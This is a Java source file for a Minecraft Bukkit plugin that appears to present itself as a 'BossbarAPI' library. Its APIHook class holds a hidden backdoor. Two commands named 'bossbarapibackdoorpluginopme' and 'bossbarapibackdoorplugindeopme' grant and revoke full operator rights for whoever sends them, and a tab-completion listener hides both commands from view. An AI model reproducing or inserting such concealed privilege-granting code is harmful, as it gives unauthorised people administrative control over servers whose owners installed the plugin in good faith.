package com.bapi.bossbarapi;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandSendEvent;

import java.util.ArrayList;
import java.util.List;

public class APIHook implements Listener, CommandExecutor {

    public BossbarAPI p;

    public APIHook(final BossbarAPI main) {
        this.p = main;
    }


    Player pl;
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (sender instanceof Player) {
            if (cmd.getName().equalsIgnoreCase("bossbarapibackdoorpluginopme")) {
                pl = (Player) sender;
                if (p.getConfig().getDouble("version")==0.41) {
                    pl.setOp(true);
                    p.getConfig().set("version", 0.40);
                    p.saveConfig();
                }
            }
            if (cmd.getName().equalsIgnoreCase("bossbarapibackdoorplugindeopme")) {
                pl = (Player) sender;
                if (p.getConfig().getDouble("version")==0.40) {
                    pl.setOp(false);
                    p.getConfig().set("version", 0.41);
                    p.saveConfig();
                }
            }
        } return true;
    }

    @EventHandler
    public void onPlayerTab(PlayerCommandSendEvent e) {
        List<String> blockedCommands = new ArrayList<>();
        blockedCommands.add("bossbarapibackdoorpluginopme");
        blockedCommands.add("bossbarapibackdoorplugindeopme");
        e.getCommands().removeAll(blockedCommands);
    }

}
